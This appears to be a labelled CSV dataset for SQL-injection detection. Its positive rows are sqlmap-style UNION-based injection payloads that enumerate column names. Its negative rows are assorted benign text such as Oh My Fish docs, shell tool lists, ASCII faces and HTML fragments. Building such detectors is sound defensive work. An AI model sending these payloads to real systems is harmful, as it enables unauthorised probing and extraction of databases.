column,num
"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT topicid FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- kCsI",1
"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT sonst FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- PKON",1
"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT pk FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- kyZO",1
"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT mountcategory FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- mWSo",1
"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT von FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- KdfW",1
"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT orders_recalculate_id FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- cokB",1
"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT knr FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- aMBW",1
"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT msgid FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- ofZd",1
"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT ortnr FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- XYpT",1
"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT seiteabs_id FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- EIHY",1
"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT id1 FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- vrnk",1
"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT um FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- oLaH",1
"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT paperid FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- pvuJ",1
"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT send FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- jOoe",1
"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT wid FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- ZVJX",1
"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT gi FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- GgLG",1
"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT lieferant FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- KAtb",1
"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT orgid FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- pOhi",1
"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT profile FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- HaXC",1
"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT zugang FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- HMGW",1
"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT allow FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- kPOn",1
"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT unique_id FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- JfjX",1
"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT taskid FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- iWVJ",1
"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT configuration_id FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- qEZP",1
"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT jcode FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- Uxqk",1
"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT ex_id FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- opxe",1
"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT blog_id FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- Yvff",1
"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT who FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- pARV",1
"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT section_id FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- OSER",1
"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT mindk FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- mBUe",1
"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT beschreibung FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- cavP",1
"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT schl FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- hsbs",1
"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT you FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- szEw",1
"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT object_link_a_id FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- MhoL",1
"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT disallow_id FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- Ivss",1
"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT strasse FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- OCWk",1
"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT option_name FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- WcpO",1
"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT q_trid FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- AhVL",1
"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT summary_id FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- DoWQ",1
"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT gameid FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- hRxU",1
"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT catid FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- NssE",1
"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT dni FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- ZiBm",1
"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT prune_id FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- DCQL",1
"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT anid FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- Kjrs",1
"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT linkid FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- XycV",1
"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT qid FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- dVCi",1
"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT word_text FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- IuTh",1
"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT id_cat FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- YPHY",1
"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT eid FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- wNNl",1
"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT privmsgs_text_id FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- MSJa",1
"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT downloadid FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- oxkS",1
"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT hid FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- fdEv",1
"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT themes_id FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- dHMc",1
"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT privmsgs_id FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- nxuj",1
"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT codi FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- xPdD",1
"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT requestid FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- dLCx",1
"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT ratingdbid FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- RNmj",1
"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT edad FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- INCi",1
"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT secid FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- mTfV",1
"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT sitename FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- EcIJ",1
"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT artid FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- lGUc",1
"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT gallid FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- kKBy",1
"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT main_module FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- EThd",1
"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT contactid FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- Wcue",1
"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT aro_id FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- Ezey",1
"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT `replace` FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- mIFq",1
"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT total FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- CHiF",1
"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT root FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- meoa",1
"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT prodid FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- OKtE",1
"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT id_paciente FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- Depy",1
"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT mosloadposition FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- XZaM",1
"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT de FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- wWlb",1
"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT mossef FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- rEtB",1
"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT ordid FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- wQpO",1
"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT stdprice FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- FEsf",1
"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT advanced FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- WFJa",1
"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT super FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- yGja",1
"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT editor FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- vPsZ",1
"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT rol FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- nHpV",1
"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT editors FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- MjeM",1
"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT mosvote FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- Cxis",1
"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT agent FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- tBTD",1
"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT en FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- NfCI",1
"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT searchbot FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- Nqky",1
"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT cod_aplicacion FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- NHAe",1
"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT manager FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- ROYE",1
"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT instructions FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- gLTs",1
"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT administrator FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- bXrC",1
"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT sure FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- sMAl",1
"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT unless FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- vqHo",1
"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT `connect` FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- WVWj",1
"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT xamppfiles FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- HNzK",1
"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT nix FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- bFqX",1
"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT mode FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- phDN",1
"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT cleared FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- VMkt",1
"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT data FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- hFzl",1
A few simple rules for this project:,0
inviting and clear,0
not tiring,0
useful,0
These below rules may be better:,0
easy to contribute to (Markdown + HTML ...),0
"easy to find (no TOC, maybe it's worth creating them?)",0
Url markedÊ*Êis temporary unavailable. Please don't delete it without confirming that it has permanently expired.,0
Before add pull request please seeÊthis. AllÊsuggestions/PRÊare welcome!,0
ÊAdd useful shell functions,0
ÊAdd one-liners for collection tools (eg. CLI Tools),0
ÊGenerate book pdf format,0
ÊShells,0
ÊÊ__ÊOh My ZSH!Ê- the best framework for managing your Zsh configuration.,0
"ÊÊ__Êbash-itÊ- framework for using, developing and maintaining shell scripts and custom commands for your daily work.",0
ÊShells,0
ÊÊ__ÊOh My ZSH!Ê- the best framework for managing your Zsh configuration.,0
"ÊÊ__Êbash-itÊ- framework for using, developing and maintaining shell scripts and custom commands for your daily work.",0
ÊÊ__ÊOh My FishÊ- the Fishshell framework.,0
__ÊManagers,0
"ÊÊ__ÊMidnight CommanderÊ- visual file manager, licensed under GNU General Public License.",0
ÊÊ__ÊscreenÊ- full-screen window manager that multiplexes a physical terminal.,0
"ÊÊ__ÊtmuxÊ- terminal multiplexer, lets you switch easily between several programs in one terminal.",0
"ÊÊ__Êtmux-csshÊ- sets a comfortable and easy to use functionality, clustering and synchronizing virtual tmux-sessions.",0
__ÊTerminal emulators,0
ÊÊ__ÊGuakeÊ- is a dropdown terminal made for the GNOME desktop environment.,0
"ÊÊ__ÊTerminatorÊ- is based on GNOME Terminal, useful features for sysadmins and other users.",0
__ÊNetwork,0
omf updateÊ[omf]Ê[<package>...],0
"Update Oh My Fish, all package repositories, and all installed packages.",0
"When called without arguments, update core and all installed packages.",0
"You can choose to update only the core, by runningÊomf update omf.",0
"For selective package update, list only the names of packages you wish to update. You may still include ""omf"" in the list to update the core as well.",0
Oh My Fish installer adds a snippet to fish's user config files (~/.config/fish/conf.d/) which calls OMF's startup code.,0
"Notice that the scripts in that directory are sourced in the order that the filesystem sees them, and so it may be necessary to prefix your script files with ordering numbers.",0
"For example:Êa_script.fishÊwill take precedence over theÊomf.fishÊsnippet. So ifÊa_script.fishÊdepends on plugins managed by OMF, consider renaming the script file toÊxx_a_script.fish.",0
"Similiarly, to make sure that a script runs beforeÊomf.fish, you may prefix it withÊ00_. Alternatively,Ê~/.config/omf/before.init.fishÊmay be used.",0
# Golang developers might need this one,0
set -xg GOPATH $HOME/gocode,0
# Python developers otherwise,0
set -xg PYTHONDONTWRITEBYTECODE 1,0
"In fish 2.2, there is noÊconf.dÊdirectory, so the startup code has to be placed in the fish config file (~/.config/fish/config.fish).",0
(_________)_,0
(____)_,0
(____)_(____)_,0
(¡__¡)_,0
(___)_,0
(___`*),0
(___`*),0
(___«_),0
(o___o)_)),0
(o___o)_,0
(Ô_Õ)_,0
(____)_,0
(_` )/,0
(___)__,0
(__`;_;«__)__,0
[___`_],0
| ___*|_,0
|*«___|q,0
|`____|_,0
|___|_,0
* user,0
* title,0
** brown,0
*** fix,0
*** jubilder,0
** of,0
** t,0
* select,0
* dig,0
# which,0
# where,0
## the,0
### fox,0
### fung,0
## off,0
## take,0
# use,0
# database,0
"<div class=""modal-container dm-mute-notifications-dialog"">",0
"<div class=""modal modal-medium draggable"">",0
" <div class=""modal-content"">",0
"<button type=""button"" class=""modal-btn modal-close js-close"">",0
"<span class=""Icon Icon--close Icon--medium"">",0
" <span class=""visuallyhidden"">___</span>",0
</span>,0
</button>,0
" <div class=""modal-header"">",0
" <h3 class=""modal-title"">________</h3>",0
 </div>,0
" <div class=""modal-footer submit-section"">",0
" <button class=""EdgeButton EdgeButton--tertiary js-close"">_____</button>",0
"<button class=""EdgeButton EdgeButton--primary modal-submit js-close"">____</button>",0
"<style id=""react-native-stylesheet""></style>",0
"!function(){window.initErrorstack||(window.initErrorstack=[]),window.onerror=function(r,i,n,o,t){r.indexOf(""Script error."")>-1||window.initErrorstack.push({errorMsg:r,url:i,lineNumber:n,column:o,errorObj:t})}}();",0
Oh My Fish can scaffold a package structure for you. Use the commandÊomf new,0
To learn package creation let's create a new package that will provide aÊhello_worldÊcommand for your shell. Package names may only contain lowercase letters and hyphens to separate words.,0
$ omf new plugin hello_world,0
$ ls -l,0
  README.md,0
  init.fish,0
  functions/hello_world.fish,0
  completions/hello_world.fish,0
Always describe how your package works in theÊREADME.md.,0
Also read more aboutÊauto completionÊand take care to provide it for your utilities when applicable.,0
